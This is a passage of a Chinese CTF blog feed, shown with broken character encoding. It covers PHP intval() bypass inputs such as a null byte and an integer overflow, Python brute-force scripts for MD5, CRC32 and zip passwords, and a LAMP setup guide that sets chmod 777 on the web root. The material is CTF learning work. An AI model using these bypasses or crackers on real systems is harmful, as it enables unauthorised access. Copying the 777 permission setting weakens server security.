åˆ©ç”¨%00ç»•è¿‡ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²åˆ¤æ–­ï¼Œç„¶åç¬¬äºŒä¸ªæ¡ä»¶éƒ½æ˜¯å˜ä¸º0å†æ¯”è¾ƒï¼Œä¸‹é¢æ›´æ˜¯æ»¡è¶³3å’Œ4çš„æ¡ä»¶</p><p>2.åˆ©ç”¨å‡½æ•°æº¢å‡ºçš„æ–¹æ³•<br><code>number=2147483647%00</code><br>ä»è¿™ä¸€ä¸ªé¢˜ç›®é‡Œé¢å­¦åˆ°ä¸€ä¸ªæ–°ç‚¹<br>é‚£å°±æ˜¯Intvalæœ€å¤§çš„å€¼å–å†³äºæ“ä½œç³»ç»Ÿã€‚<br>32ä½ç³»ç»Ÿæœ€å¤§å¸¦ç¬¦å·çš„ integer èŒƒå›´æ˜¯ <code>-2147483648</code> åˆ° <code>2147483647</code>ã€‚ä¸¾ä¾‹ï¼Œåœ¨è¿™æ ·çš„ç³»ç»Ÿä¸Šï¼Œ<code>intval(â€˜1000000000000â€™)</code> ä¼šè¿”å› <code>2147483647</code>ã€‚<br>æ‰€ä»¥åœ¨ç¬¬ä¸‰ä¸ªæ¡ä»¶çš„æ—¶å€™ç¿»è½¬å˜æˆ7463847412å†å˜æˆæ•´å½¢ä¹Ÿæ˜¯<code>2147483647</code>ï¼Œç»•è¿‡ç¬¬ä¸‰ä¸ªæ¡ä»¶ï¼Œç¬¬å››ä¸ªæ¡ä»¶ä¹Ÿå°±ä¸€èµ·ç»•è¿‡äº†ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p><code>intval()</code>è½¬æ¢çš„æ—¶å€™ï¼Œä¼šå°†ä»å­—ç¬¦ä¸²çš„å¼€å§‹è¿›è¡Œè½¬æ¢çŸ¥é“é‡åˆ°ä¸€ä¸ªéæ•°å­—çš„å­—ç¬¦ã€‚<br>å³ä½¿å‡ºç°æ— æ³•è½¬æ¢çš„å­—ç¬¦ä¸²ï¼Œ<code>intval()</code>ä¸ä¼šæŠ¥é”™è€Œæ˜¯è¿”å›0ã€‚</p><p>æ‰€ä»¥å‘¢ç°åœ¨è¿™ä¸ªintvalå‡½æ•°æˆ‘è§‰å¾—çš„æœ‰å‡ ä¸ªç‚¹å¯ä»¥å»åˆ©ç”¨çš„<br>1.æº¢å‡º<br>2.16è¿›åˆ¶é€šå¸¸æ˜¯é…åˆ<code>is_numeric()</code>ä½¿ç”¨<br>3.ç§‘å­¦è®¡æ•°æ³•<br>ä¸‹é¢å°±æ˜¯ä¸€ä¸ªç§‘å­¦è®¡æ•°æ³•çš„ä¾‹å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump((int)(<span class="string">'1e-1000'</span>)&gt;<span class="number">0</span>);</span><br><span class="line">var_dump(<span class="string">'1e-1000'</span>&gt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">bool(<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump((int)(<span class="string">'1e-10'</span>)&gt;<span class="number">0</span>);</span><br><span class="line">var_dump(<span class="string">'1e-10'</span>&gt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>åœ¨ç§‘å­¦è®¡æ•°æ³•å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—æ—¶ï¼Œå¦‚æœ E åé¢çš„æ•°å°äºæŸä¸ªå€¼ä¼šå¼„æˆ double ç±»å‹ï¼Œå†å¼ºåˆ¶è½¬æ¢ä¸º int ç±»å‹æ—¶å¯èƒ½ä¼šæœ‰å¥‡å¦™çš„ç»“æœï¼Œæµ‹è¯•å‘ç°æŸå˜é‡ä¸º 1e-1000 æ—¶å·²ç»å¯ä»¥è§¦å‘è¿™ä¸ªæ¼æ´ç»•è¿‡ä¸¤ä¸ªæ£€æŸ¥ï¼Œä½¿å¾—æŸå˜é‡æ—¢å¤§äº 0 åˆä¸å¤§äº 0ã€‚</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å°ç»“ä¸€æ³¢CTFé‡Œé¢å¯èƒ½ç”¨åˆ°çš„è„šæœ¬</title>
      <link href="/CTF-python.html"/>
      <url>/CTF-python.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬äººæ¸£æ¸£ï¼Œåªæ˜¯ä¸ºäº†æ€»ç»“è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹ï¼Œè¯·å¤§ä½¬è«å–·</p><a id="more"></a><h2 id="base64è§£ç "><a href="#base64è§£ç " class="headerlink" title="base64è§£ç "></a>base64è§£ç </h2><p>æœ‰æ—¶å€™é¢˜ç›®ä¼šè®©ä½ æŠŠbaseå…¨å®¶æ¡¶ç”¨ä¸Šï¼Œä½ å°±å¯ä»¥åƒä¸‹é¢è¿™æ ·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str1 = <span class="string">'your string'</span></span><br><span class="line"><span class="keyword">print</span> base64.b64decode(str1)</span><br><span class="line"><span class="keyword">print</span> base64.b32decode(str1)</span><br><span class="line"><span class="keyword">print</span> base64.b16decode(str1)</span><br></pre></td></tr></table></figure><h2 id="requestsåº“"><a href="#requestsåº“" class="headerlink" title="requestsåº“"></a>requestsåº“</h2><p>ä¸“é—¨ç”¨äºå¿«é€Ÿæäº¤ç½‘é¡µæ‰€éœ€è¦çš„ä¸œè¥¿æˆ–è€…æ˜¯å¤šæ¬¡è®¿é—®ä½ æäº¤çš„ä¸œè¥¿<br>å‚è€ƒæ–‡ç« ï¼š<a href="http://www.bxsteam.xyz/2017/04/26/python-requests%e6%80%bb%e7%bb%93/" target="_blank" rel="noopener">http://www.bxsteam.xyz/2017/04/26/python-requests%e6%80%bb%e7%bb%93/</a><br>ä¸€èˆ¬éƒ½æ˜¯ä¸‹é¢çš„å½¢å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'your url'</span></span><br><span class="line"></span><br><span class="line">s  = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">str1  = r.headers[<span class="string">'flag'</span>].split(<span class="string">':'</span>)[<span class="number">1</span>]   <span class="comment">#æŠ“åŒ…çœ‹æ¸…æ¥šæ˜¯å•¥æ‰è¡Œï¼Œæœ‰å¯èƒ½ä¸æ˜¯flagï¼Œæ˜¯å…¶ä»–çš„</span></span><br><span class="line">data = &#123;<span class="string">'key'</span>:str1&#125;</span><br><span class="line"><span class="keyword">print</span> s.post(url,data).text</span><br><span class="line"><span class="keyword">print</span> s.post(url,data).content</span><br></pre></td></tr></table></figure><p>æœ‰æ—¶å€™è¦ä½ å°½å¯èƒ½å¿«ï¼Œå¯èƒ½ä½ å¾—å°½é‡ç¼©å°ä»£ç é‡è¾¾åˆ°æ›´å¿«çš„æ•ˆæœ</p><h2 id="å­—ç¬¦ä¸²çš„åŒ¹é…"><a href="#å­—ç¬¦ä¸²çš„åŒ¹é…" class="headerlink" title="å­—ç¬¦ä¸²çš„åŒ¹é…"></a>å­—ç¬¦ä¸²çš„åŒ¹é…</h2><p>è¿ç”¨æ­£åˆ™re<br>ä¸‹é¢æ˜¯ä¸€é“åŒ¹é…æ­£ç¡®MD5é¢˜ç›®æ‰€å†™å‡ºæ¥çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">md51 = <span class="string">'your wrong md5'</span></span><br><span class="line">pattern = <span class="string">r'[1-9a-z]'</span></span><br><span class="line">str1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md51:</span><br><span class="line"><span class="keyword">if</span> re.search(pattern,i):</span><br><span class="line">str1 = str1+i</span><br><span class="line"><span class="keyword">print</span> str1</span><br></pre></td></tr></table></figure><h2 id="çˆ†ç ´MD5çš„"><a href="#çˆ†ç ´MD5çš„" class="headerlink" title="çˆ†ç ´MD5çš„"></a>çˆ†ç ´MD5çš„</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string.uppercase:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> string.uppercase:</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> string.uppercase:</span><br><span class="line"> a=<span class="string">'TASC'</span>+i+<span class="string">'O3RJMV'</span>+j+<span class="string">'WDJKX'</span>+k+<span class="string">'ZM'</span></span><br><span class="line">             b=md5.md5(a).hexdigest()</span><br><span class="line">              <span class="keyword">if</span>(b[<span class="number">0</span>:<span class="number">5</span>]==<span class="string">'e9032'</span>):  </span><br><span class="line">                             <span class="keyword">print</span> b</span><br></pre></td></tr></table></figure><h3 id="md5æ¨¡å—çš„å„å‚æ•°"><a href="#md5æ¨¡å—çš„å„å‚æ•°" class="headerlink" title="md5æ¨¡å—çš„å„å‚æ•°"></a>md5æ¨¡å—çš„å„å‚æ•°</h3><p>md5.md5(s)</p><pre><code>è¿”å›å­—ç¬¦ä¸²sçš„md5</code></pre><p>md5.update(arg)</p><pre><code>ç”¨stringå‚æ•°argæ›´æ–°md5å¯¹è±¡ã€‚å³å°†è¦è®¡ç®—argçš„æ¶ˆæ¯æ‘˜è¦å€¼ã€‚</code></pre><p>md5.digest()</p><pre><code>è¿”å›16å­—èŠ‚çš„æ‘˜è¦ï¼Œç”±ä¼ ç»™updateçš„stringç”Ÿæˆï¼Œæ‘˜è¦æ²¡æœ‰asciiå­—ç¬¦</code></pre><p>md5.hexdigest()</p><pre><code>ä»¥16è¿›åˆ¶çš„å½¢å¼è¿”å›æ‘˜è¦ï¼Œ32ä½</code></pre><p>  è¿˜æœ‰ä¸€ç§hashlib,è¿™ä¸œè¥¿å¥½åƒæ˜¯py3åªèƒ½ç”¨å®ƒäº†ï¼Œæˆ‘è¯•äº†ä¸€ä¸‹ï¼Œå¥½åƒä¸æ€ä¹ˆè¡Œï¼Œè·‘ä¸å‡ºç­”æ¡ˆã€‚ã€‚ã€‚ä½†æ˜¯å®ƒåŠŸèƒ½å¾ˆå¼ºå¤§ï¼Œè¿˜æœ‰sha1ç®—æ³•å•¥çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string.uppercase:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> string.uppercase:</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> string.uppercase:</span><br><span class="line">a = <span class="string">'TASC'</span>+i+<span class="string">'O3RJMV'</span>+j+<span class="string">'WDJKX'</span>+k+<span class="string">'ZM'</span></span><br><span class="line"><span class="comment">#c = hashlib.new('md5', string=a).hexdigest()</span></span><br><span class="line">b = hashlib.md5(a)</span><br><span class="line">c = b.hexdigest()</span><br><span class="line"><span class="keyword">if</span>(c[<span class="number">0</span>:<span class="number">5</span>]==<span class="string">'e90032'</span>):</span><br><span class="line"><span class="keyword">print</span> c</span><br></pre></td></tr></table></figure><h2 id="CRC32çˆ†ç ´"><a href="#CRC32çˆ†ç ´" class="headerlink" title="CRC32çˆ†ç ´"></a>CRC32çˆ†ç ´</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line">dic=string.printable     <span class="comment">#å„ç§æ‰“å°å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line">crc = <span class="string">'''ä½ çš„è¾“å…¥ '''</span>     <span class="comment"># è®°å¾—è¦ä»¥0xå¼€å¤´</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">s=i+j+p+q</span><br><span class="line"><span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>åœ¨ Python 2.x çš„ç‰ˆæœ¬ä¸­ï¼Œbinascii.crc32 æ‰€è®¡ç®—å‡ºä¾†çš„ CRC å€¼åŸŸä¸º[-2^31, 2^31-1] ä¹‹é—´çš„æœ‰ç¬¦å·æ•´æ•°ï¼Œä¸ºäº†è¦ä¸ä¸€èˆ¬CRC ç»“æœä½œæ¯”å¯¹ï¼Œéœ€è¦å°†å…¶è½¬ä¸ºæ— ç¬¦å·æ•´æ•°ï¼Œæ‰€ä»¥åŠ ä¸Š&amp; 0xffffffffæ¥è¿›è¡Œè½¬æ¢ã€‚å¦‚æœæ˜¯ Python 3.x çš„ç‰ˆæœ¬ï¼Œå…¶è®¡ç®—ç»“æœä¸º [0, 2^32-1] é—´çš„æ— ç¬¦å·æ•´æ•°ï¼Œå› æ­¤ä¸éœ€é¢å¤–åŠ ä¸Š&amp; 0xffffffff ã€‚</p><h2 id="è¿›è¡Œå¼‚æˆ–è¿ç®—"><a href="#è¿›è¡Œå¼‚æˆ–è¿ç®—" class="headerlink" title="è¿›è¡Œå¼‚æˆ–è¿ç®—"></a>è¿›è¡Œå¼‚æˆ–è¿ç®—</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">f1 = open(<span class="string">'æ–‡ä»¶è·¯å¾„'</span>,<span class="string">'rb'</span>)  <span class="comment"># æ­¤å¤„rbæ˜¯æŒ‡ä»¥äºŒè¿›åˆ¶è¯»å–æ–‡ä»¶,äºŒè¿›åˆ¶æ‰èƒ½è¿›è¡Œå¼‚æˆ–è¿ç®—çš„å‘€233333</span></span><br><span class="line">f2 = open(<span class="string">'æ–‡ä»¶è·¯å¾„'</span>,<span class="string">'rb'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="string">""</span>.join(f1.readlines())  <span class="comment">#è¿™é‡Œçš„readlinesè·Ÿreadå·®ä¸å¤šï¼ŒreadlinesæŠŠå…¨æ–‡è¯»å–åæŒ‰ç…§è¡Œçš„å½¢å¼å­˜è¿›åˆ—è¡¨ï¼Œæ‰€ä»¥ä¸€ç‰ˆä¸€è¡Œè¡Œéå†æˆ‘ä»¬ç”¨for i in f.readlines()ã€‚ã€‚è€Œreadç›´æ¥ç®€å•ç²—æš´ï¼Œè€Œreadlineç®€å•è¯»å–ä¸€è¡Œ,å¼ºè¡Œå¤ä¹ ä¸€æ³¢python</span></span><br><span class="line">b = <span class="string">""</span>.join(f2.readlines())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s= <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> zip(a,b):  <span class="comment">#è¿™é‡Œçš„zipæ˜¯æŒ‡å¤šä¸ªåºåˆ—æˆ–è€…æ˜¯è¿­ä»£å™¨çš„å…ƒç´ ï¼Œç»„åˆæˆå…ƒç»„ã€‚è¿”å›çš„å…ƒç»„çš„é•¿åº¦æ˜¯æ‰€æœ‰è¾“å…¥åºåˆ—ä¸­æœ€çŸ­çš„</span></span><br><span class="line">s+=chr(ord(i)^ord(j))</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><h2 id="zipæš´åŠ›ç ´è§£"><a href="#zipæš´åŠ›ç ´è§£" class="headerlink" title="zipæš´åŠ›ç ´è§£"></a>zipæš´åŠ›ç ´è§£</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extractFile</span><span class="params">(zfile,pwd)</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">zfile.extractall(pwd = pwd)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'password found : %s'</span> % pwd</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span> </span><br><span class="line">zFile = zipfile.ZipFile(<span class="string">'your zip'</span>) </span><br><span class="line">passFile = open(<span class="string">'dictionary.txt'</span>) </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> passFile.readlines(): </span><br><span class="line">password = line.strip(<span class="string">'\n'</span>) </span><br><span class="line">t = Thread(target=extractFile, args=(zFile, password)) <span class="comment">#å‡½æ•°æ€§ç¼–ç¨‹çš„å½±å­ã€‚å› ä¸ºç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‡½æ•°ã€‚ã€‚</span></span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="ç»“æŸè¯­"><a href="#ç»“æŸè¯­" class="headerlink" title="ç»“æŸè¯­"></a>ç»“æŸè¯­</h2><p>å…¶å®pythonçœŸçš„å¾ˆå¼ºå¤§ï¼Œåšé¢˜çš„æ—¶å€™è¿˜æ˜¯æœ‰ç±»ä¼¼ä¸€äº›ç›²æ³¨ä¹‹ç±»çš„é¢˜ç›®ä¹Ÿä¼šç”¨åˆ°å®ƒï¼Œåªæ˜¯æˆ‘æ˜¯èœé¸¡ï¼Œåªèƒ½å‡­è‡ªå·±ç†è§£å†™ä¸€ä¸‹ï¼Œä»¥åå¸Œæœ›æœ‰æ—¶é—´è¿˜èƒ½è¡¥å……ä¸€ä¸‹ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>]]></content>
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ubantuä¸‹éƒ¨ç½²LAMPä»¥åŠå¤ç°ä¸€é“CTFé¢˜ç›®</title>
      <link href="/Ubantu-Web.html"/>
      <url>/Ubantu-Web.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»Šå¤©ä¸‹åˆç”¨è™šæ‹Ÿæœºåœ¨Windowsè£…é…æœåŠ¡å™¨ã€‚ã€‚è§‰å¾—ç”¨ç±»ä¼¼phpstudyçš„å‚»ç“œåŒ…å¤ªç®€å•äº†ï¼Œä½†æ˜¯å¯¹æ¯”ä¹‹ä¸‹ï¼ŒLinuxå°±å€¼å¾—å¥½å¥½è®°å½•ä¸€ç•ªäº†ï¼Œæœ¬äººæ¸£æ¸£ï¼Œè¯·å‹¿å–·ã€‚ã€‚ã€‚</p><a id="more"></a><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>é€šè¿‡è¿™ä¸€æ¬¡éƒ¨ç½²å­¦ä¼šäº†å¦‚ä½•æ­å»ºLAMPï¼Œè¿˜é¡ºä¾¿è¿˜åŸä¸€é“CTFååºåˆ—åŒ–é¢˜ç›®ã€‚ã€‚ã€‚</p><p>åŒæ—¶æ„Ÿè°¢å¤§é¥¼çš„æœåŠ¡å™¨ï¼Œè™½ç„¶æåˆ°åé¢è£…PHPçš„æ—¶å€™å¯èƒ½æŠŠä»–æœåŠ¡å™¨æœ‰äº›ä¸œè¥¿æåäº†ï¼Œæ‰€ä»¥æˆ‘è¿˜æ˜¯ç”¨è‡ªå·±çš„è™šæ‹Ÿæœºæ¨¡æ‹Ÿä¸€éå§ï¼Œæ¯•ç«Ÿæˆ‘æ˜¯ä¸ªæ–°æ‰‹ï¼Œå‘½ä»¤è¡Œ+å¯è§†åŒ–å¯¹äºåˆå­¦è€…æ¥è¯´ç»„åˆè¿˜æ˜¯æ¯”è¾ƒä¸é”™çš„</p><p>æˆ‘ç”¨çš„æ˜¯è™šæ‹Ÿæœºä¸‹Ubuntu14.04æ­å»ºLAMPç¯å¢ƒæ­å»º Apacheã€MySQLã€PHP</p><h3 id="å®‰è£…é¡ºåºï¼š"><a href="#å®‰è£…é¡ºåºï¼š" class="headerlink" title="å®‰è£…é¡ºåºï¼š"></a>å®‰è£…é¡ºåºï¼š</h3><p>ä¸€èˆ¬æ¥è¯´æ¯”è¾ƒå»ºè®®çš„é¡ºåºæ˜¯Mysql Apache æœ€åå®‰è£…PHPï¼ŒPHPä¸€å®šè¦å®‰è£…åœ¨è¿™ä¸¤ä¸ªåé¢ï¼Œå› ä¸ºæ˜¯è¦ä¾èµ–Apacheå’ŒMysqlçš„æœåŠ¡çš„ã€‚ï¼ˆåæ­£æˆ‘ç”¨å¿«ç…§æ¢å¤ä¸¤ä¸‰æ¬¡ï¼‰</p><p>ä¸‹é¢çš„å‘½ä»¤éƒ½æ˜¯åœ¨rootæƒé™ä¸‹æ‰§è¡Œçš„ï¼Œå¯¹äº†ï¼Œæˆ‘ä½¿ç”¨çš„Xshellè¿æ¥è™šæ‹Ÿæœºçš„æ¡¥æ¥æ¨¡å¼ä¸‹çš„ä¹Œç­å›¾ï¼Œè®°å¾—è½¬åˆ°rootæƒé™å•Š233333</p><h3 id="MysSQLå®‰è£…ï¼š"><a href="#MysSQLå®‰è£…ï¼š" class="headerlink" title="MysSQLå®‰è£…ï¼š"></a>MysSQLå®‰è£…ï¼š</h3><p>æ‰“å¼€å‘½ä»¤è¡Œè¾“å…¥ ï¼š<code>apt-get install mysql-server</code>  é€‰æ‹©y<br>å®‰è£…çš„æœŸé—´ä¼šå‡ºç°è¾“å…¥Mysqlçš„ç®¡ç†å‘˜å¯†ç çš„æç¤ºï¼Œè®¾ç½®ä¸€ä¸‹Mysqlçš„å¯†ç å³å¯ï¼š<br><img src="https://s1.ax1x.com/2018/05/20/CgyyWD.png" alt="CgyyWD.png"></p><p>è£…å®Œåè¾“å…¥<code>netstat -tap | grep mysql</code> æ˜¾ç¤ºç›‘å¬çš„ç«¯å£å³è¡¨ç¤ºå®‰è£…æˆåŠŸ</p><h3 id="å®‰è£…Apache"><a href="#å®‰è£…Apache" class="headerlink" title="å®‰è£…Apache"></a>å®‰è£…Apache</h3><p>åœ¨å‘½ä»¤è¡Œè¾“å…¥<code>apt-get install apache2</code> é€‰æ‹©y<br>ç„¶åæ‰“å¼€ä¹Œç­å›¾çš„æµè§ˆå™¨è¾“å…¥127.0.0.1å‡ºç°ä¸‹é¢çš„ç”»é¢å°±æˆåŠŸäº†<br><img src="https://s1.ax1x.com/2018/05/20/CgyROA.png" alt="CgyROA.png"></p><h3 id="å®‰è£…PHP"><a href="#å®‰è£…PHP" class="headerlink" title="å®‰è£…PHP"></a>å®‰è£…PHP</h3><p>è¾“å…¥apt-get install php5 libapache2-mod-php5<br><img src="https://s1.ax1x.com/2018/05/20/CgyfeI.png" alt="CgyfeI.png"><br>ä¸è¦æ€ªæˆ‘å®‰è£…çš„ç‰ˆæœ¬å¤ªä½ã€‚ã€‚ã€‚å› ä¸ºé¶åœºæœ‰äº›æ¼æ´éœ€è¦ä½é…çš„php</p><p>ä¸‹ä¸€æ­¥å¾ˆé‡è¦</p><h3 id="wwwç›®å½•ææƒ"><a href="#wwwç›®å½•ææƒ" class="headerlink" title="wwwç›®å½•ææƒ"></a>wwwç›®å½•ææƒ</h3><p>å°†wwwç›®å½•æ›´æ”¹ä¸‹æ‰€æœ‰æƒä»¥ä¾¿å¯ä»¥æ–°å»ºæ–‡æ¡£ è¾“å…¥<code>chmod 777 /var/www</code><br><img src="https://s1.ax1x.com/2018/05/20/Cgyhwt.png" alt="Cgyhwt.png"></p><p>æ–°å»ºä¸€ä¸ªphpæ–‡ä»¶æ£€éªŒä¸€ä¸‹å•Š<br>å¼ºå¤§çš„vimç¼–è¾‘å™¨å‡ºæ¥äº†<br>æ–°å»ºä¸€ä¸ªæ–‡æ¡£ï¼š <code>vi /var/www/html/phpinfo.php</code></p><p>æŒ‰ä¸‹ié”®ç¼–è¾‘æ–‡ä»¶ è¾“å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">   phpinfo();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ESC åè¾“å…¥:wqä¿å­˜é€€å‡ºã€‚<br>å¦‚æœè¿˜ä¸æ‡‚ä¸€äº›å¸¸ç”¨çš„vimå‘½ä»¤çš„è¯ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹æˆ‘ä»¥å‰å†™çš„æ–‡ç« <a href="https://0verwatch.top/Linux-learn.html">æˆ‘ä»¥å‰å†™çš„æ–‡ç« </a></p><h3 id="é‡å¯ä¸‹Apacheï¼š"><a href="#é‡å¯ä¸‹Apacheï¼š" class="headerlink" title="é‡å¯ä¸‹Apacheï¼š"></a>é‡å¯ä¸‹Apacheï¼š</h3><p>è¾“å…¥<code>/etc/init.d/apache2 restart</code> </p><p>åœ¨ä¹Œç­å›¾çš„æµè§ˆå™¨ä¸­è¾“å…¥ <code>127.0.0.1/phpinfo.php</code>,å‡ºç°PHPçš„ç›¸å…³é…ç½®ä¿¡æ¯å³è¡¨ç¤ºæˆåŠŸ<br><img src="https://s1.ax1x.com/2018/05/20/CgyIFf.png" alt="CgyIFf.png"></p><h3 id="å®‰è£…ç›¸å…³çš„PHPä¸Mysqlçš„æ‰©å±•åŒ…ï¼š"><a href="#å®‰è£…ç›¸å…³çš„PHPä¸Mysqlçš„æ‰©å±•åŒ…ï¼š" class="headerlink" title="å®‰è£…ç›¸å…³çš„PHPä¸Mysqlçš„æ‰©å±•åŒ…ï¼š"></a>å®‰è£…ç›¸å…³çš„PHPä¸Mysqlçš„æ‰©å±•åŒ…ï¼š</h3><figure class="highlight plain"><table><tr><td 